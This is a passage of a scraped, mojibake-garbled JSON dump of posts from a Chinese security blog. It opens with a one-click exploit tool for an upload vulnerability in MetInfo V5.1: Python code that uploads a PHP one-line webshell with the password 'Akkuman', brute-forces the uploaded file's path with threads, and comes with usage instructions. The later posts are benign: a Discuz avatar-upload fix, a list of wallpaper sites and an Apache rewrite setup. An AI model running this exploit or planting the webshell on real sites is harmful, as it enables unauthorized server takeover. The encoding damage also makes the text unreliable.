f.write(\u0026#39;%s?e=YXNzZXJ0\\n\u0026#39;%base_url) def main(target_url,thread_num,time_out): #å–å‡ºå½“å‰æ—¶é—´æˆ³å¹¶åˆ é™¤åå››ä½ now = str(int(time.time()))[:-4] #å°†æ‰€æœ‰çš„å¾…çˆ†ç ´åœ°å€éå†å¹¶åŠ å…¥é˜Ÿåˆ— for i in range(0,10): for j in range(100,1000): num_str = \u0026#39;\u0026#39;.join((str(i),str(j))) url = \u0026#39;\u0026#39;.join((\u0026#39;%s/upload/file/%s\u0026#39; % (target_url,now),num_str,\u0026#39;.php\u0026#39;)) urls.put(url) #ä¸Šä¼ æ–‡ä»¶ with open(\u0026#39;xiaoma.php\u0026#39;,\u0026#39;w+\u0026#39;) as fi: fi.write(\u0026#34;\u0026lt;?php $e = $_REQUEST[\u0026#39;e\u0026#39;];register_shutdown_function(base64_decode($e), $_REQUEST[\u0026#39;Akkuman\u0026#39;]);?\u0026gt;\u0026#34;) data = { \u0026#39;fd_para[1][para]\u0026#39;:\u0026#39;filea\u0026#39;, \u0026#39;fd_para[1][type]\u0026#39;:\u0026#39;5\u0026#39; } files = {\u0026#39;filea\u0026#39;: open(\u0026#34;xiaoma.php\u0026#34;, \u0026#39;rb\u0026#39;)} upload_url = \u0026#39;%s/feedback/uploadfile_save.php?met_file_format=pphphp\u0026amp;met_file_maxsize=9999\u0026amp;lang=metinfo\u0026#39; % target_url res = requests.post(upload_url,data = data,files=files) #ç­‰å¾…ä¸¤ç§’ æ–‡ä»¶ä¸Šä¼  time.sleep(2) #å¯åŠ¨å¤šçº¿ç¨‹ for i in range(int(thread_num)): t = threading.Thread(target = bp,args=(urls,time_out,)) t.start() if __name__ == \u0026#39;__main__\u0026#39;: if len(sys.argv) != 4: print \u0026#39;Example : %s http://www.xxx.com 20 0\u0026#39; % sys.argv[0] else: main(sys.argv[1],sys.argv[2],sys.argv[3]) ç¨‹åºç•¥æ˜¾ç²—ç³™\nä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä¹ŸæŠŠä»–æ‰“åŒ…æˆäº†exe\nç„¶åé—²ç€æ²¡äº‹ï¼Œæƒ³ç€ç®€å•åœ°ç»™ä»–åšäº†ä¸ªç•Œé¢,è¿™æ ·çš„ æ–‡ä»¶è¯´æ˜ MetInfo V5.1ä¸Šä¼ æ¼æ´getshellåˆ©ç”¨å·¥å…·\nä½œè€… : Akkuman\næ¼æ´åŸç†è¯¦è§http://www.wooyun.org/bugs/wooyun-2010-0139168\nä½¿ç”¨è¯´æ˜ï¼š æœ¬ç›®å½•æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªpyï¼Œä¸€ä¸ªexe å› ä¸ºexeæ˜¯pyæ–‡ä»¶æ‰“åŒ…è€Œæˆï¼Œæ•…æ–‡ä»¶è¾ƒå¤§ 64ä½ç³»ç»Ÿæµ‹è¯•ä½¿ç”¨é€šè¿‡\nå¦‚æœä½ å®‰è£…äº†py2.xç¯å¢ƒ pyæ–‡ä»¶ä½¿ç”¨æ–¹æ³• æ‰“å¼€cmd python baopo.py http://www.xxx.com 20 0 20æ˜¯çº¿ç¨‹æ•°ï¼Œ0æ˜¯æ¯æ¬¡è¯·æ±‚ç­‰å¾…æ—¶é—´ï¼ˆç½‘ç«™é™åˆ¶æ—¶å¯è®¾ç½®ä¸º2æˆ–3ï¼‰å¯ä»¥è‡ªå·±æŒ‡å®š\nexeå‘½ä»¤è¡Œæ–‡ä»¶ä½¿ç”¨æ–¹æ³• æ‰“å¼€cmd baopo.exe http://www.xxx.com 20 0 20æ˜¯çº¿ç¨‹æ•°ï¼Œ0æ˜¯æ¯æ¬¡è¯·æ±‚ç­‰å¾…æ—¶é—´ï¼ˆç½‘ç«™é™åˆ¶æ—¶å¯è®¾ç½®ä¸º2æˆ–3ï¼‰å¯ä»¥è‡ªå·±æŒ‡å®š\nGUIç¨‹åºï¼Œåº”è¯¥ä¸ç”¨è¯´\nå…³äºgetshellä¸ç»“æœ ä¸Šä¼ çš„æ˜¯å›è°ƒä¸€å¥è¯æœ¨é©¬\n1 \u0026lt;?php \u0026gt;$e=$_REQUEST[\u0026#39;e\u0026#39;];register_shutdown_function(base64_decode($e),$_\u0026gt;REQUEST[\u0026#39;Akkuman\u0026#39;]);?\u0026gt; èœåˆ€è¿æ¥ï¼Œå¯†ç æ˜¯Akkuman\nçˆ†ç ´ç»“æœä¼šç”Ÿæˆåœ¨url.txt\nä¸‹è½½åœ°å€ï¼š (è®¿é—®ç :1475)\nè½¬è½½è¯·æ³¨æ˜å‡ºå¤„\nä½œè€…åšå®¢ www.hacktech.cn\n","permalink":"https://www.hacktech.cn/post/metinfo-v5-1-getshell%E4%B8%80%E9%94%AE%E5%8C%96%E5%B7%A5%E5%85%B7.html","summary":"\u003chr\u003e\n\u003ch1 id=\"æ¼æ´è§£æ\"\u003eæ¼æ´è§£æï¼š\u003c/h1\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003econfig/config.inc.php\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e18\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e19\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e20\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e21\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e22\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e23\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e24\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e25\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e26\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e27\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e28\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e29\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e30\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e31\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$langoks \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $db\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eget_one\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;SELECT * FROM \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$met_lang\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e WHERE lang=\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$lang\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e$langoks)\u003cspan style=\"color:#66d9ef\"\u003edie\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;No data in the database,please reinstall.\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e$langoks[\u003cspan style=\"color:#a6e22e\"\u003euseok\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;!\u003c/span\u003e$metinfoadminok)\u003cspan style=\"color:#a6e22e\"\u003eokinfo\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;../404.html\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ecount\u003c/span\u003e($met_langok)\u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)$lang\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$met_index_type;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;SELECT * FROM \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$met_config\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e WHERE lang=\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$lang\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39; or lang=\u0026#39;metinfo\u0026#39;\u0026#34;\u003c/span\u003e;\u003cspan style=\"color:#75715e\"\u003e//çœ‹è¿™é‡Œ\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $db\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003equery\u003c/span\u003e($query);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e($list_config\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $db\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003efetch_array\u003c/span\u003e($result)){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e($metinfoadminok)$list_config[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;value\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003estr_replace\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026amp;#34;\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003estr_replace\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026amp;#39;\u0026#39;\u003c/span\u003e,$list_config[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;value\u0026#39;\u003c/span\u003e]));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t$settings_arr[]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$list_config;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e($list_config[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;columnid\u0026#39;\u003c/span\u003e]){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t$settings[$list_config[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e$list_config[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;columnid\u0026#39;\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$list_config[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;value\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t$settings[$list_config[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$list_config[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;value\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e@\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eextract\u003c/span\u003e($settings);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003chr\u003e","title":"MetInfo V5.1 GetShellä¸€é”®åŒ–å·¥å…·"},{"content":" discuz ä¸èƒ½ä¸Šä¼ å¤´åƒæç¤ºcan not write to the data/tmp folder è§£é‡Šï¼š disuczå¤´åƒä¸Šä¼ ä¸æˆåŠŸï¼Œæç¤ºdata/tmpç›®å½•æ²¡æœ‰å†™å…¥æƒé™ï¼Œè¿™é‡Œçš„data/tmpæ˜¯ç½‘ç«™æ ¹ç›®å½•uc_server/data/tmpè¿™ä¸ªç›®å½•ï¼Œè€Œä¸æ˜¯æ ¹ç›®å½•/data/tmpç›®å½•ï¼Œå…¶å®/dataä¸‹é¢æœ¬æ¥æ²¡æœ‰tmpç›®å½•ã€‚\nè§£å†³åŠæ³•ï¼š é¦–å…ˆçœ‹çœ‹uc_server/data/tmpæœ‰æ— å†™å…¥æƒé™ï¼Œå¦‚æœæœ‰æƒé™é‚£ä¹ˆå°±æŒ‰ç…§å¦‚ä¸‹è§£å†³æ–¹æ³•ï¼Œéœ€è¦ä¿®æ”¹php.iniï¼Œæ‰¾åˆ°open_basediré€‰é¡¹ï¼Œè¡Œé¦–åŠ åˆ†å·;æ³¨é”€å³å¯ã€‚\n","permalink":"https://www.hacktech.cn/post/discuz-%E4%B8%8D%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F%E6%8F%90%E7%A4%BAcan-not-write-to-the-datatmp-folder.html","summary":"\u003chr\u003e\n\u003ch1 id=\"discuz-ä¸èƒ½ä¸Šä¼ å¤´åƒæç¤ºcan-not-write-to-the-datatmp-folder\"\u003ediscuz ä¸èƒ½ä¸Šä¼ å¤´åƒæç¤ºcan not write to the data/tmp folder\u003c/h1\u003e\n\u003chr\u003e\n\u003ch2 id=\"è§£é‡Š\"\u003eè§£é‡Šï¼š\u003c/h2\u003e\n\u003cp\u003edisuczå¤´åƒä¸Šä¼ ä¸æˆåŠŸï¼Œæç¤ºdata/tmpç›®å½•æ²¡æœ‰å†™å…¥æƒé™ï¼Œè¿™é‡Œçš„data/tmpæ˜¯ç½‘ç«™æ ¹ç›®å½•uc_server/data/tmpè¿™ä¸ªç›®å½•ï¼Œè€Œä¸æ˜¯æ ¹ç›®å½•/data/tmpç›®å½•ï¼Œå…¶å®/dataä¸‹é¢æœ¬æ¥æ²¡æœ‰tmpç›®å½•ã€‚\u003c/p\u003e","title":"discuz ä¸èƒ½ä¸Šä¼ å¤´åƒæç¤ºcan not write to the data/tmp folder"},{"content":"æˆ‘åœ¨è¿™é‡Œç»™å¤§å®¶æ¨èå‡ ä¸ªä¸é”™çš„å£çº¸ç½‘ç«™\næ¯•ç«Ÿä¸€å¼ èµå¿ƒæ‚¦ç›®çš„å£çº¸èƒ½è®©ä½ çš„å·¥ä½œæ•ˆç‡æé«˜ä¸å°‘\næ³¨æ„å‰æ–¹é«˜èƒ½\nä¸€å¤§æ³¢ç½‘ç«™å³å°†æ¥è¢­\nä¸€ç³»åˆ— å¦‚ä½ æ‰€è§ alphacoders wallpaperdj Wallhaven(æ¨è) wallpaperswa eweb4 wallls topwallpapers wallpaperfo wallpapermay picstopin wallpaperup wall321 wallsave wallpaperswide desktopnexus goodfon vladstudio(æ¨è) simpledesktops(æç®€) interfacelift kuvva switch-box gde-fon bingimages wallpaper4k(æ¨è) feelgrafix facets(å…ƒç´ å—æ„å›¾) justinmaller(ç•¥æŠ½è±¡) 7-themes superhd fondos7 forwallpaper(æ¨è) å¤§Bç«™çš„åŠ¨æ¼«å£çº¸ï¼ŒäºŒæ¬¡å…ƒå¯é€‰ å°±æ¨èåˆ°è¿™é‡Œå§ï¼ŒåŸºæœ¬ä¸Šæ˜¯æœåˆ®åˆ«äººçš„ç­”æ¡ˆè€Œæ¥ï¼Œè‡ªå·±éƒ½æœ‰çœ‹è¿‡\n","permalink":"https://www.hacktech.cn/post/many-website-of-wallpaper.html","summary":"\u003cp\u003eæˆ‘åœ¨è¿™é‡Œç»™å¤§å®¶æ¨èå‡ ä¸ªä¸é”™çš„å£çº¸ç½‘ç«™\u003c/p\u003e\n\u003cp\u003eæ¯•ç«Ÿä¸€å¼ èµå¿ƒæ‚¦ç›®çš„å£çº¸èƒ½è®©ä½ çš„å·¥ä½œæ•ˆç‡æé«˜ä¸å°‘\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eæ³¨æ„å‰æ–¹é«˜èƒ½\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eä¸€å¤§æ³¢ç½‘ç«™å³å°†æ¥è¢­\u003c/strong\u003e\u003c/p\u003e\n\u003ch1 id=\"ä¸€ç³»åˆ—--å¦‚ä½ æ‰€è§\"\u003eä¸€ç³»åˆ—  å¦‚ä½ æ‰€è§\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://wall.alphacoders.com/\"\u003ealphacoders\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://wallpaperdj.com/\"\u003ewallpaperdj\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://alpha.wallhaven.cc/\"\u003eWallhaven(\u003cem\u003eæ¨è\u003c/em\u003e)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"Many Website Of WallPaper"},{"content":"è¿˜æ²¡å¼€å§‹å°±è¢«åˆ«äººç»‘å®šäº†åŸŸå äº‹æƒ…çš„èµ·å› ä¸å‘ç° åˆšä¹°äº†ä¸ªæœåŠ¡å™¨æ­å»ºäº†ä¸€ä¸ªdzï¼Œæƒ³ç€åŸŸåè¿˜æ²¡å¤‡æ¡ˆï¼Œå°±å…ˆæ­å»ºäº†èµ·æ¥ï¼Œç„¶ååœ¨åšDDOSæµ‹è¯•æ—¶å¶ç„¶å‘ç°æœåŠ¡å™¨è¢«åˆ«äººæ¶æ„æŠŠåŸŸåç»‘å®šäº†\næœ€åˆçš„è§£å†³æ–¹æ¡ˆ æ²¡ç®¡ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ åæ¥å‘ç°æœ‰å½±å“ï¼Œæœ‹å‹ä¹Ÿä¸€ç›´ç»™æˆ‘è¯´å«æˆ‘æ•´ä¸‹\nåˆ©ç”¨é‡å®šå‘æŠŠæ¶æ„æŒ‡å‘è¿‡æ¥çš„åŸŸåæŒ‡åˆ°åˆ«å¤„ è¦åˆ©ç”¨301é‡å®šå‘ï¼Œé¦–å…ˆæˆ‘ä»¬è¦åœ¨Apacheä¸Šé…ç½®ä¸€ä¸‹ï¼ŒApacheé»˜è®¤æ˜¯ä¸å¼€å¯.htaccessçš„\n0x01.ç¼–è¾‘httpd.confæ–‡ä»¶ æ‰“å¼€/etc/httpd/confç›®å½•ä¸‹çš„httpd.confæ–‡ä»¶ï¼Œæ‰¾åˆ°è¿™ä¸€è¡Œï¼š\n1 LoadModule rewrite_module modules/mod_rewrite.so å½“ç„¶ï¼Œä½ å¾—ç¡®å®šä½ çš„/etc/httpd/modulesä¸‹æœ‰mod_rewrite.soè¿™ä¸ªæ–‡ä»¶\n1 ls /etc/httpd/modules | grep mod_rewrite å¦‚æœä½ æ²¡æœ‰æ‰¾åˆ°è¿™ä¸€è¡Œï¼Œè®°å¾—åœ¨httpd.confæ–‡ä»¶é‡Œç›´æ¥æ·»åŠ è¿™ä¸€è¡Œ\n0x02.è®¾ç½®AllowOverride åŒæ ·çš„åœ¨httpd.confæ–‡ä»¶ä¸­æ‰¾åˆ°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;Directory \u0026#34;/var/www/html\u0026#34;\u0026gt; # # Possible values for the Options directive are \u0026#34;None\u0026#34;, \u0026#34;All\u0026#34;, # or any combination of: # Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews # # Note that \u0026#34;MultiViews\u0026#34; must be named *explicitly* --- \u0026#34;Options All\u0026#34; # doesn\u0026#39;t give it to you. # # The Options directive is both complicated and important. Please see # http://httpd.apache.org/docs/2.4/mod/core.html#options # for more information. # Options Indexes FollowSymLinks # # AllowOverride controls what directives may be placed in .htaccess files. # It can be \u0026#34;All\u0026#34;, \u0026#34;None\u0026#34;, or any combination of the keywords: # Options FileInfo AuthConfig Limit # AllowOverride All # # Controls who can get stuff from this server. # Require all granted \u0026lt;/Directory\u0026gt; æˆ–è€…å®ƒé•¿è¿™ä¸ªæ ·å­ï¼š\n1 2 3 4 \u0026lt;Directory /\u0026gt; Options FollowSymLinks AllowOverride None \u0026lt;/Directory\u0026gt; ä»€ä¹ˆï¼Œä½ å‘Šè¯‰æˆ‘è¿˜æ˜¯æ‰¾ä¸åˆ°ï¼Ÿï¼Ÿï¼Ÿ é‚£æ•™ä½ ä¸€ä¸ªåŠæ³• é”å®šå…³é”®è¯FollowSymLinkså’ŒAllowOverride None\nviçš„å‘ä¸‹æŸ¥æ‰¾å‘½ä»¤æ˜¯:/ä½ è¦æŸ¥æ‰¾çš„ viçš„å‘ä¸ŠæŸ¥æ‰¾å‘½ä»¤æ˜¯:?ä½ è¦æŸ¥æ‰¾çš„ næ˜¯ä¸‹ä¸€ä¸ª Næ˜¯ä¸Šä¸€ä¸ª\nç›¸ä¿¡ä½ å·²ç»æ‰¾åˆ°äº† 